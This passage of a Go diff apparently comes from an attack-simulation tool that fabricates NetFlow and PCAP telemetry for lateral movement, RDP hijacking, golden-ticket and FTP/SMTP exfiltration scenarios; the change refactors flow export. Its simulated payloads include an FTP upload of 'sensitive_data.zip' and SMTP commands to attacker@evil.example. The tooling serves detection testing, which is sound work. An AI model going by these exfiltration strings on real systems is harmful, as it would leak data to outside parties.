 			{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 135, Protocol: 6, Bytes: 3000, Packets: 10, StartTime: time.Now(), EndTime: time.Now().Add(2 * time.Second), TCPFlags: 0x18},
 			{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: highPort, Protocol: 6, Bytes: 20000, Packets: 40, StartTime: time.Now(), EndTime: time.Now().Add(5 * time.Second), TCPFlags: 0x18},
 		}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount += len(flows)
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 		// PCAP (Option B)
 		wmiPath, wmiErr := PCAPLateralWMI(req.RunID, req.AttackerIP, targetIP, highPort)
 		if wmiErr == nil {
@@ -1088,12 +1007,9 @@ func runDCOMLateral(req AttackRequest) (*AttackResult, error) {
 			result.EventIDs = append(result.EventIDs, eventID)
 		}
 		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 135, Protocol: 6, Bytes: 15000, Packets: 30, StartTime: time.Now(), EndTime: time.Now().Add(5 * time.Second), TCPFlags: 0x18}}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount++
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 
 		// PCAP (Option B)
 		dcomPath, dcomErr := PCAPLateralDCOM(req.RunID, req.AttackerIP, targetIP)
@@ -1126,12 +1042,9 @@ func runRDPHijack(req AttackRequest) (*AttackResult, error) {
 			result.EventIDs = append(result.EventIDs, eventID)
 		}
 		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 3389, Protocol: 6, Bytes: 500000, Packets: 1000, StartTime: time.Now().Add(-60 * time.Second), EndTime: time.Now(), TCPFlags: 0x18}}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount++
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 
 		// PCAP (Option B)
 		rdpPath, rdpErr := PCAPLateralRDPHijack(req.RunID, req.AttackerIP, targetIP)
@@ -1164,12 +1077,9 @@ func runFTPExfil(req AttackRequest) (*AttackResult, error) {
 		{SrcIP: req.AttackerIP, DstIP: c2IP, SrcPort: randomPort(), DstPort: 21, Protocol: 6, Bytes: 2000, Packets: 20, StartTime: time.Now(), EndTime: time.Now().Add(2 * time.Second), TCPFlags: 0x18},
 		{SrcIP: req.AttackerIP, DstIP: c2IP, SrcPort: randomPort(), DstPort: 20, Protocol: 6, Bytes: uint32(dataMB * 1048576), Packets: uint32(dataMB * 700), StartTime: time.Now(), EndTime: time.Now().Add(time.Duration(dataMB) * time.Second), TCPFlags: 0x18},
 	}
-	if fw != nil && fw.Telemetry.Netflow {
-		ExportNetflowV9(fw.IPAddress, flows)
-	}
-	result.FlowCount += len(flows)
-	flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, c2IP, "TCP", flows)
-	result.EventIDs = append(result.EventIDs, flowID)
+	fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, c2IP, "TCP", flows)
+	result.FlowCount += fc
+	result.EventIDs = append(result.EventIDs, fids...)
 
 	ftpPayload := []byte("STOR sensitive_data.zip\r\n")
 	ftpResp := []byte("150 Opening BINARY mode data connection.\r\n226 Transfer complete.\r\n")
@@ -1204,12 +1114,9 @@ func runSMTPExfil(req AttackRequest) (*AttackResult, error) {
 			result.EventIDs = append(result.EventIDs, eventID)
 		}
 		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 25, Protocol: 6, Bytes: uint32(dataMB * 1048576), Packets: uint32(dataMB * 700), StartTime: time.Now(), EndTime: time.Now().Add(time.Duration(dataMB*5) * time.Second), TCPFlags: 0x18}}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount++
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 
 		smtpPayload := []byte(fmt.Sprintf("MAIL FROM:<%s>\r\nRCPT TO:<attacker@evil.example>\r\nDATA\r\n", req.AttackerIP))
 		smtpResp := []byte("250 OK\r\n250 OK\r\n354 Start mail input; end with <CRLF>.<CRLF>\r\n")
@@ -1248,12 +1155,9 @@ func runGoldenTicket(req AttackRequest) (*AttackResult, error) {
 			{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 88, Protocol: 17, Bytes: 5000, Packets: 12, StartTime: time.Now(), EndTime: time.Now().Add(3 * time.Second)},
 			{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 445, Protocol: 6, Bytes: 50000, Packets: 80, StartTime: time.Now(), EndTime: time.Now().Add(10 * time.Second), TCPFlags: 0x18},
 		}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount += len(flows)
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "UDP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "UDP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 		goldenPath, goldenErr := PCAPGoldenTicket(req.RunID, req.AttackerIP, targetIP, "CORP.LOCAL", user)
 		if goldenErr == nil {
 			result.PCAPFiles = append(result.PCAPFiles, goldenPath)
@@ -1289,12 +1193,9 @@ func runSSHTunnel(req AttackRequest) (*AttackResult, error) {
 			{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 22, Protocol: 6, Bytes: 500000, Packets: 1000, StartTime: time.Now().Add(-300 * time.Second), EndTime: time.Now(), TCPFlags: 0x18},
 			{SrcIP: targetIP, DstIP: fmt.Sprintf("10.0.3.%d", 1+rand.Intn(50)), SrcPort: randomPort(), DstPort: uint16(remotePort), Protocol: 6, Bytes: 200000, Packets: 400, StartTime: time.Now().Add(-290 * time.Second), EndTime: time.Now(), TCPFlags: 0x18},
 		}
-		if fw != nil && fw.Telemetry.Netflow {
-			ExportNetflowV9(fw.IPAddress, flows)
-		}
-		result.FlowCount += len(flows)
-		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
-		result.EventIDs = append(result.EventIDs, flowID)
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
+		result.FlowCount += fc
+		result.EventIDs = append(result.EventIDs, fids...)
 
 		sshPayload := []byte("SSH-2.0-OpenSSH_8.9\r\n")
 		sshResp := []byte("SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5\r\n")
